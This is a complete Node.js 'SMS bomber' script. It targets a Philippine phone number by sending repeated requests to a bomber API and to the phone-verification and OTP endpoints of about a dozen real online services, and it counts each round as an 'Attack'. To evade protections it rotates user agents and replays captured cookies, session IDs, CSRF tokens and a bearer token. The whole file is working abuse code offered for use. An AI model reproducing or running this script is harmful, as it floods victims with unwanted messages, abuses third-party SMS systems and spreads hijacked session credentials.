(async()=>{
    "use strict";

    // Dependencies
    const randomUA = require("random-useragent")
    const chalk = require("chalk").default
    const ky = require("ky").default

    // Variables
    const args = process.argv.slice(2)

    // Functions
    const log = (type, message)=>{
        if(type === "i") console.log(`${chalk.cyanBright("[PSMSB]")} ${message}`)
        if(type === "e") console.log(`${chalk.redBright("[PSMSB]")} ${message}`)
    }

    // Main
    if(!args.length){
        console.log("usage: node index.js <phoneNumber> <amount>")
        process.exit()
    }

    console.log(chalk.yellowBright("Philippines Phone Number SMS Bomber - NCryptsion"))
    log("i", "Bombing the phone number...")
    for( let i = 1; i <= args[1]; i++ ){
        try{
            const response = await ky.get(`https://oreo.gleeze.com/api/smsbomber?phone=${args[0]}&amount=1`, {
                headers: {
                    referer: "https://oreo.gleeze.com/",
                    "user-agent": randomUA.getRandom()
                }
            })

            response.status === 200 || response.status === 201 ? log("i", `[Oreo] Success. Attack: ${i}`) : log("e", `[Oreo] Failed. Attack: ${i}`)
        }catch{
            log("e", `[Oreo] Failed. Attack: ${i}`)
        }

        try {
            const response = await ky.post(`https://www.citilink.ru/registration/confirm/phone/+63${args[0].slice(1)}/`, {
                headers: {
                    accept: "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "fr-FR,fr",
                    cookie: "_pcl=eW5jY/+J6eIKrg==; old_design=0; is_show_welcome_mechanics=1; _tuid=bfa4749db8e83787741b6d039407f632bf8c7dd1; _space=psk_cl%3A; ab_test=90x10v4%3A1%7Creindexer%3A1%7Cdynamic_yield%3A1%7Cwelcome_mechanics%3A4%7Cdummy%3A10; ab_test_analytics=90x10v4%3A1%7Creindexer%3A1%7Cdynamic_yield%3A1%7Cwelcome_mechanics%3A4%7Cdummy%3A10; ab_test_main_1_1_98=3; _slfs=1667497919016; _slid=6363ffb10ae16ce93d0f54eb; _slsession=22984220-F353-40B5-9A72-0604DF3D4AC9; _slfreq=6347f312d9062ed0380b52dc%3A6347f38c9a3f3b9e90027775%3A1667505121; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; _slid_server=6363ffb10ae16ce93d0f54eb",
                    origin: "https://www.citilink.ru",
                    referer: "https://www.citilink.ru/",
                    "sec-ch-ua": `"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"`,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": `"macOS"`,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": randomUA.getRandom(),
                    "x-requested-with": "XMLHttpRequest"
                }
            })

            response.status === 200 || response.status === 201 ? log("i", `[Citilink] Success. Attack: ${i}`) : log("e", `[Citilink] Failed. Attack: ${i}`)
        } catch {
            log("e", `[Citilink] Failed. Attack: ${i}`)
        }

        try {
            const response = await ky.post("https://u.icq.net/api/v89/rapi/auth/sendCode", {
                headers: {
                    "Content-Type": "application/json",
                    accept: "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "fr-FR,fr",
                    origin: "https://web.icq.com",
                    referer: "https://web.icq.com/",
                    "sec-ch-ua": `"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"`,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": `"macOS"`,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "cross-site",
                    "user-agent": "user"
                },
                json: {
                    reqId: "85231-1668029727",
                    params: {
                        phone: `+63${args[0].slice(1)}`,
                        language: "en-US",
                        route: "sms",
                        devId: "ic1rtwz1s1Hj1O0r",
                        application: "icq"
                    }
                }
            })

            response.status === 200 || response.status === 201 ? log("i", `[ICQ] Success. Attack: ${i}`) : log("e", `[ICQ] Failed. Attack: ${i}`)
        } catch {
            log("e", `[ICQ] Failed. Attack: ${i}`)
        }

       try {
            const response = await ky.post("https://api.wheely.com/v6/auth/oauth/token", {
                headers: {
                    "Content-Type": "application/json",
                    accept: "application/json, text/plain, */*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru",
                    dnt: "1",
                    origin: "https://wheely.com",
                    referer: "https://wheely.com/",
                    "sec-ch-ua": `"Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"`,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": `"Windows"`,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-site",
                    "user-agent": "user",
                    "x-wheely-sign": "eyJ0eXBlIjoiY2FwdGNoYSIsInNpZ25hdHVyZSI6IlAwX2V5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUp3WVhOemEyVjVJam9pTkVkemJqUnlaMVpTUjAxMWNFZHNiMGxLT0ZwT1NURjNTMVpxWjBkNGVqWmhSVEUwZVd0SVEyTlJWR2cwV0hWTE5qQndOMlZZYUVsNlEwazRTakZVTXpsalEycE9RWGw2Vm1oS2QzQjBjbGQ1TlZaQ1NVNUVaRzFsTkZGRlIydG1iMDl6TVVSaFoyeDJaVnBIVnpObGFGWXpZa1kyY1VZeFdIQXpZa3c0TVdwTVJVaFhkbTQ0Ymtvek1GZE5SRUUzZFhSWVdsSjVTblIzWjNBeU1sTkZNemhEVjFCa1JGZGFSMXBpTXprNE5HSXlOa3huZURWVmJHaFdhRkZQYnpCcGRHbGFkMnRSZWpBclRVTTJka2t3ZFVOdFNHOURRbXhOUVUwM1dWVm1aVTQ0TDI5c04yRm9XbUY2TW1GMFYyMW9Ra2h0TkZaeFlUTkZOa1ZsT0VWdlJtOWtRWE12Y0VOdU1IbERXbk42T0M5VWMxYzJZVTlGYnpoQk5EZEdhbUprZWpaYU5XeEdObUU0VjBzd1UzQkJOVFZPYm1samEyWnRlVXRuWjBOeVQwaEhXRVJvV1RkamJIRTRObTltTTNkaVUyaHRhbUZMV0NzNU9EbFZla2RXVDB4WlJ6VXpVRzQxV1dGSkwzQXZRbUZXWWpaUFYzY3pjRWxOVUZGeFUzSnFPVW80ZG5KQmVscEtVV3RtYUdWU1JtTjFSUzlwYmxSVFF6Sk1RelZxT1VoSU4xZzNVRlJoTXpCWldrZ3JUVmxQUm1RNE9XRTBUbmhrUmtzcmJFTmhhMlYwV0UwMFdIaGplRFV3UTFKSVpWVlRaek5zYTFaVlZIaExVVGx0Wmxwa04wUlphRXhUWVRodU1DOURiSGhIVVdGcFdVOXhjRWg0U0RCeFdsSXpjM1ZIUjBWak4ySTBVRmxJWjNaaksydE5hVU41U0ZFemFWWnVRemxGVFhkNFJHdDZVMmM0ZEZocWVHZENlbnB3YjFJelNscFhRM2hsWkZZMGNUWjNjak15TkVoUmNtVnFjbWN3YWs0eWFYaDRlWHBsWlRBM1VsTXdTMnBzTVRkbmNVNDJkM0ZWVVM5V1V6VTNNM1JTZUdwS1JYVjVOV2RZWlc1WU5VRlFjRFpZYmxaWldUa3JXRTVxZUd4bFozVXZZVTB2Y1V4UU9Xb3ZjMHQxSzA5WWFrOUdTemxKUTBnM05EZHJjRWN5TTJreFkxcExRVzg0V21neWNsVnJhblpzUTA1cmVsUnBRV3QzTXpabk55ODJVWE01YXpaU1IwNXNjM0ZWTldwS1drcHhMMVF5ZEVwVk9WRnJlRzFoTUdzMFlXdHliR2Q1UkZGVVZtaHBlV1ZFV1ZWVGNYSkhUM0oxY1haYU1TOXRNbEJuVGpkV01FVXZOMjFaYUdGelNESnVTR2RpVTBsamVXcFdhVmQwVW5KUlFtbFVjVzlVZW05blpUbFFjMFpwTlhCUVFubEdUVFpOVDFWNFRuRnFWV2xOUkdKT00wTlFWRVpyWTNBNE5FTkpaV1pNTm1Kck5FSjZZM29yU21OdFNqSm9jV3RrZFRoSU5UWjNWRmRJUjNWUE1uUlFkWFJGWW1KTU9FdHVXRmh0TlRWNlUwbHJUVXB3YTBGeFRGZ3JSV3cwYkZwSFNETTRTM05qY0RFd09DczJNV2RpU2tGRFoyWkNWa2hXYURkbFRqUkpUbEpUVEdVeGIyWjZPWFZHWlhkV1drSXpZa05oUTBkMGRuUm1Ta1pHVUhwWFluWm9NM0ZqSzNWYWEzbHBOR056WTBsT2QzSndRMVJZY2sxR05XaGhiVXBOTm0xd1NEWTVkRzB2V0had1NVZG9aWEF3VFhCcGNHVkxXREV5VDFCM09ERjFjRU5YVDJSMU4wbHlabk5wUW1waVFrUkdOMHBxY0dkaVowOTVkMUZaWTFSeWVFODFTWGhzZFRkWWNVOUVjbEpLYVRSalZUTnJOM3AyVjJSTlpVNDVjV1pTU0hkeVowSk1PR3MyVUhCYU5DOXpjSFJ3TXpJNVEzVXZLM2hIVUdjemJtdFhXV3RSZFd4SmRWRlZUV3hSUTI5UVkxQlhNV3Q2WVVsRGNrVnllVGhEVkRSUVZsaGxWa2xYVEhrNWRHWjRaak5KVkdoTFpERm9NV2hGWWpsVFNtaHljRVY1TVhGaGVIVTJaeXRqZG1WQmQwRm1SVUpvZVhoTk9XeFZVMWhFUnpadlEwcDFOblJUZERWNVVGaERNRWhoYURFNGRUTXJVRFE1VEV4UmNGQkNUeXRtVkdwbVdVSjRVM1ZyZHpKc2FUTlRUbXhESzNsRlJFNUZNbmswTDJZd1dIY3dSMG8wWVdOYVFrNDNkVXhTVFdOb01YcG1NWGgwTkRGWE9WUm9iM3BtWTNKNlRucHVXRGRsY3k5dmRGaDJTM0ZMWm1OR2NHRlZNVWxSZEU1M1VXNVdjbTF5Um5wbFJuUmlkbFJZTjBkRFFrdFRVRUpyUVUxVVJuRktOR1ZOVTNoM2NrZG1kMGRUVUdSTGFDdEpWSFpXVEV4RFEwdEdhR04yZVhwWVpXOXJTWEUyTmpKd1JVbENlQ3Q2T0hwdmNHVjVhVUYyVURFek55czJSSFJSTlZwYWNISlpSbEFpTENKbGVIQWlPakUyTmpnd01qazBORFlzSW5Ob1lYSmtYMmxrSWpvek16azFNVEF6TURNc0luQmtJam93ZlEuaEQ4RHIzRFRxenRZb3JzNTQ0ZjJRQzVsQ0V6LVY1WkhDeWZJNFFtcmdpbyJ9",
                },
                json: {
                    app_id: "55e085968a5da59241000001",
                    phone: `+63${args[0].slice(1)}`
                }
            })

            response.status === 200 || response.status === 201 ? log("i", `[Wheely] Success. Attack: ${i}`) : log("e", `[Wheely] Failed. Attack: ${i}`)
        } catch {
            log("e", `[Wheely] Failed. Attack: ${i}`)
        }

        try {
            const response = await ky.post("https://www.shoppinglive.ru/phone-verification/send-code", {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    accept: "application/json, text/plain, */*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "fr-FR,fr",
                    origin: "https://www.shoppinglive.ru",
                    referer: "https://www.shoppinglive.ru/",
                    "sec-ch-ua": `"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"`,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": `"macOS"`,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": randomUA.getRandom()
                },
                cookies: {
                    "anonymous-consents": "[]",
                    "abtc": "787EC619484F2A7B4C166802604530920674",
                    "abtc-text-button_2": "default_text",
                    "abtc-story-test_5": "story_exist",
                    "abtc-checkout-button_2": "active_button",
                    "abtc-crm-test_3": "owm_crm",
                    "abtc-fast-buy-listing_1": "fast_buy_listing",
                    "cookie-notification": "NOT_ACCEPTED",
                    "ROUTE": ".accstorefront-cbd86fdb8-r9fqp",
                    "AKA_A2": "A",
                    "akaas_sn_www_shoppinglive_ru": "2147483647~rv=14~id=02330a70b8ea956d92b323dd5a0c4036~rn=Traffic%20Shift%20RU%20clone%201",
                    "userWasLogin": "true",
                    "JSESSIONID": "9296AB25A1624615EB76E2B2065219A5.accstorefront-cbd86fdb8-r9fqp",
                    "exp_id": "default_text/fast_buy_listing/story_exist/active_button/owm_crm",
                    "sl-cart": "2d001440-4742-42b0-a799-97ec1f86ea05"
                },
                body: new URLSearchParams({
                    mobilePhone: `63${args[0].slice(1)}`,
                    CSRFToken: "00bc3ff8-f081-483d-ab0e-bb026785114f"
                })
            })

            response.status === 200 || response.status === 201 ? log("i", `[ShoppingLive] Success. Attack: ${i}`) : log("e", `[ShoppingLive] Failed. Attack: ${i}`)
        } catch {
            log("e", `[ShoppingLive] Failed. Attack: ${i}`)
        }

        try {
            const response = await ky.post("https://www.vprok.ru/as_send_pin", {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    accept: "application/json, text/plain, */*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "fr-FR,fr",
                    origin: "https://www.vprok.ru",
                    referer: "https://www.vprok.ru/",
                    "sec-ch-ua": `"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"`,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": `"macOS"`,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "user",
                    "x-xsrf-token": "eyJpdiI6IjNRXC84aFdpcWdIcys0d2F0M1I2WU9RPT0iLCJ2YWx1ZSI6IjdGejB4M29SQ2ozR2FLV1BiNmxidEc0dmU1WUREZ0VoNWV0QjNUdzMycTg3NjlPaXRcL1RKT29NVzIyR3E2Mk4waHlSZE1oRXAwN0s5YzlFNnB6Z2QrQT09IiwibWFjIjoiODAxZmZlOGU5YWQ5ZTU2MmE0YjRjNmJmY2QzYzE0MWQyMzMzZjUxMDYyYzAwNGI5NzBhNTI4NGRlODg3OGIzNyJ9"
                },
                cookies: {
                    region: "1",
                    deliveryTypeId: "1",
                    standardShopId: "2527",
                    luuid: "73c0fa54-2927-4afa-a372-6004f8647bb6",
                    suuid: "d739609b-436f-4502-a032-67dba9fdc97e",
                    "XSRF-TOKEN": "eyJpdiI6IjNRXC84aFdpcWdIcys0d2F0M1I2WU9RPT0iLCJ2YWx1ZSI6IjdGejB4M29SQ2ozR2FLV1BiNmxidEc0dmU1WUREZ0VoNWV0QjNUdzMycTg3NjlPaXRcL1RKT29NVzIyR3E2Mk4waHlSZE1oRXAwN0s5YzlFNnB6Z2QrQT09IiwibWFjIjoiODAxZmZlOGU5YWQ5ZTU2MmE0YjRjNmJmY2QzYzE0MWQyMzMzZjUxMDYyYzAwNGI5NzBhNTI4NGRlODg3OGIzNyJ9",
                    access_token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9....",
                    split_segment_amount: "11",
                    aid: "eyJpdiI6InBvZnl6VVp2WWhMSUdGTXBpSEJZeHc9PSIsInZhbHVlIjoia0ZQSTd0RFwvTVRWV3I0M2ZyamZxN3N2R3d2Vmg2S0V4bGJBRWFlckY5YkZ4V0srWWhybzRDM3JYaVRQa0cwNzVsUWllSkZhSHhEWXE0bzlGQUxqc2p3PT0iLCJtYWMiOiIyYjUxOWEyYjU5MzAwNDcyMTRiMmQ3NmIzMWE1YjJkNzgyNzg0NGM5MDRlNzgxOWM4NGI1MWQ4OTdhZjYyZDJmIn0%3D"
                },
                body: new URLSearchParams({
                    phone: `+63${args[0].slice(1)}`
                })
            })

            response.status === 200 || response.status === 201 ? log("i", `[Vprok] Success. Attack: ${i}`) : log("e", `[Vprok] Failed. Attack: ${i}`)
        } catch {
            log("e", `[Vprok] Failed. Attack: ${i}`)
        }

        try {
            const response = await ky.patch("https://www.onetwotrip.com/_auth/profile/phone/with-confirm", {
                headers: {
                    "Content-Type": "application/json",
                    accept: "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "fr-FR,fr",
                    "cache-control-version": "527d4952171b0b0f1b75544d1b090b09091b0a02010e02010e021b7c766f",
                    origin: "https://www.onetwotrip.com",
                    referer: "https://www.onetwotrip.com/ru/p/account",
                    "sec-ch-ua": `"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"`,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": `"macOS"`,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin"
                },
                cookies: {
                    referrer_first: "dir",
                    referrer_hist: "dir",
                    referrer: "",
                    accept_language: "ru",
                    abst: "test_a",
                    vid: "b13a31d4-2feb-49e0-8f7d-a33aface1476",
                    rm: "758e2f3b6d1c747c776f37d331f76b8d495a65cbf5c3d910a30406cf76ecdbfa7f187a8a9223f69f6d26e1b75398615fbbb5cda084fa43362bb7598246bea249",
                    sid: "g0v+9sLViCLWl3Koz3ws/AwH",
                    ENVID: "production-a|Y2VvQ"
                },
                json: {
                    phone: `+63${args[0].slice(1)}`,
                    reseller: ""
                }
            })

            response.status === 200 || response.status === 201 ? log("i", `[OneTwoTrip] Success. Attack: ${i}`) : log("e", `[OneTwoTrip] Failed. Attack: ${i}`)
        } catch {
            log("e", `[OneTwoTrip] Failed. Attack: ${i}`)
        }

        try {
            const response = await ky.post("https://adengi.ru/rest/v1/registration/code/send", {
                headers: {
                    "Content-Type": "application/json",
                    accept: "application/json, text/plain, */*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "fr-FR,fr",
                    origin: "https://adengi.ru",
                    referer: "https://adengi.ru/registration/personal",
                    "sec-ch-ua": `"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"`,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": `"macOS"`,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": randomUA.getRandom(),
                    "x-device-uid": "b22e8141-a6a2-49e9-addf-d0958d4b2bef",
                    "x-version-fe": "1666591147478"
                },
                cookies: {
                    _ga: "GA1.2.2108841258.1667680421",
                    _gid: "GA1.2.1628483400.1667680421",
                    tmr_lvid: "5c385c2b38e5657a71fb6f8ccf348cf0",
                    tmr_lvidTS: "1667680421368",
                    _ym_uid: "1667680422433564150",
                    _ym_d: "1667680422",
                    _ym_isad: "2",
                    _ym_visorc: "w",
                    supportOnlineTalkID: "ePvRx7CdRMpAMGC57X7IPaLHCSGEI8mL",
                    __cfruid: "354aabc5d3d3f1aed72964ff31d4d7043119adac-1667680508",
                    ec_id: "b22e8141-a6a2-49e9-addf-d0958d4b2bef",
                    tmr_detect: "0%7C1667680526135",
                    deviceUid: "ff004018-91ab-4913-9761-9c8c510136c2",
                    tmr_reqNum: "15"
                },
                json: {
                    email: "e0grijoekg3_dwdw@hotmail.com",
                    firstName: "Василий",
                    hash: "a6ac90134b55d015bd2731fd4e2f06d3",
                    lastName: "Пупин",
                    middleName: "Иванович",
                    phone: `+63${args[0].slice(1)}`,
                    timestamp: 1667680555,
                    via: "sms"
                }
            })

            response.status === 200 || response.status === 201 ? log("i", `[Adengi] Success. Attack: ${i}`) : log("e", `[Adengi] Failed. Attack: ${i}`)
        } catch {
            log("e", `[Adengi] Failed. Attack: ${i}`)
        }

        try {
            const response = await ky.post("https://bmp.megafon.tv/api/v10/auth/register/msisdn", {
                headers: {
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "fr-FR,fr",
                    "Connection": "keep-alive",
                    "Content-Type": "application/json",
                    "Cookie": "SessionID=baMlJmKhzoYnXn2NFKHNsQuF0hUrwWnKpjcm5VLEkVU",
                    "Host": "bmp.megafon.tv",
                    "Origin": "https://megafon.tv",
                    "Referer": "https://megafon.tv/",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                    "User-Agent": randomUA.getRandom(),
                    "sec-ch-ua": `"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"`,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": `"macOS"`
                },
                json: {
                    msisdn: `+63${args[0].slice(1)}`,
                    password: "200147200147"
                }
            })

            response.status === 200 || response.status === 201 ? log("i", `[MegaFon] Success. Attack: ${i}`) : log("e", `[MegaFon] Failed. Attack: ${i}`)
        } catch {
            log("e", `[MegaFon] Failed. Attack: ${i}`)
        }

        try {
            const response = await ky.post("https://borrow.zaymigo.com/rpc/v1", {
                headers: {
                    "Content-Type": "application/json",
                    accept: "application/json, text/plain, */*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "fr-FR,fr",
                    origin: "https://borrow.zaymigo.com",
                    referer: "https://borrow.zaymigo.com/",
                    "sec-ch-ua": `"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"`,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": `"macOS"`,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": randomUA.getRandom()
                },
                cookies: {
                    "__ddg1_": "7adIg7X1SQ3s1sqTbKQz",
                    "PHPSESSID": "a840033f0d2b10e34442f83013bb3f0f",
                    "partner": "zseo"
                },
                json: {
                    jsonrpc: "2.0",
                    id: "15930021-2bf0-4be4-acef-065304196abb",
                    method: "create",
                    params: {
                        borrower: {
                            surname: "Пупкин",
                            name: "Василий",
                            patronymic: "Андреевич",
                            patronymicNotExists: false,
                            phone: `+63${args[0].slice(1)}`,
                            email: "example@email.com",
                            phoneParams: []
                        },
                        term: 12,
                        amount: 10000,
                        agreements: [
                            {
                                name: "assignment_of_claims",
                                val: true
                            }
                        ]
                    }
                }
            })

            response.status === 200 || response.status === 201 ? log("i", `[Zaymigo] Success. Attack: ${i}`) : log("e", `[Zaymigo] Failed. Attack: ${i}`)
        } catch {
            log("e", `[Zaymigo] Failed. Attack: ${i}`)
        }

        try {
            const response = await ky.post("https://api-new.elementaree.ru/graphql", {
                headers: {
                    "Authorization": "Bearer 5mV0xfl6pp5yCOKcwOTy1bY6-V8wPtwn",
                    "Content-Type": "application/json",
                    accept: "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "fr-FR,fr",
                    origin: "https://elementaree.ru",
                    referer: "https://elementaree.ru/",
                    "sec-ch-ua": `"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"`,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": `"macOS"`,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-site"
                },
                json: {
                    operationName: "phoneVerification",
                    variables: {
                        phone: `+63${args[0].slice(1)}`
                    },
                    query: `mutation phoneVerification($phone: String!) {
                        phoneVerification(phone: $phone) {
                            success
                            interval
                            __typename
                        }
                    }`
                }
            })

            response.status === 200 || response.status === 201 ? log("i", `[Elementaree] Success. Attack: ${i}`) : log("e", `[Elementaree] Failed. Attack: ${i}`)
        } catch {
            log("e", `[Elementaree] Failed. Attack: ${i}`)
        }

        try {
            const response = await ky.post("https://widget.verifykit.com/v2.1/otp-start?token=dma6839823b8e9ceeb7ba5e4d7987db521f71d5f12ff44b2372da1deac246", {
                headers: {
                    accept: "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    dnt: "1",
                    origin: "https://widget.verifykit.com",
                    referer: "https://widget.verifykit.com/v2.1/?token=dma6839823b8e9ceeb7ba5e4d7987db521f71d5f12ff44b2372da1deac246&lang=ru",
                    "sec-ch-ua": `"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"`,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": `"Windows"`,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "x-requested-with": "XMLHttpRequest"
                },
                body: new URLSearchParams({
                    countryCode: "RU",
                    isMobileBrowser: "0",
                    phoneOperatingSystem: "android",
                    phoneNumber: `+63${args[0].slice(1)}`
                })
            })

            response.status === 200 || response.status === 201 ? log("i", `[VerifyKit] Success. Attack: ${i}`) : log("e", `[VerifyKit] Failed. Attack: ${i}`)
        } catch {
            log("e", `[VerifyKit] Failed. Attack: ${i}`)
        }
    }

    log("i", "Attack is finished.")
})()